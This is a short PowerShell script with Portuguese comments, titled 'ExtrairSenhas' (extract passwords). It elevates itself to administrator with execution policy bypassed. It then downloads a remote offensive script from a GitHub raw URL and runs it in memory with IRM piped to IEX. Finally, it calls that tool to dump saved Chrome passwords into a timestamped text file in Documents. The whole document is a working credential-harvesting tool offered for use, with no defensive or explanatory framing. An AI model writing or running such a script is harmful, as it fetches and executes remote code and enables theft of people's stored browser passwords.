# ExtrairSenhas.ps1 - Versão AUTÔNOMA (salve no computador)

# Força execução como administrador (mantém a janela)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define a pasta Documents
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Baixa e executa o script original
Write-Host "Carregando script..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Extraindo senhas..." -ForegroundColor Cyan
Invoke-PowerChrome -Browser Chrome *> $arquivoSaida

Write-Host "Concluído! Arquivo salvo em: $arquivoSaida" -ForegroundColor Green
Write-Host "Pressione qualquer tecla para sair..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
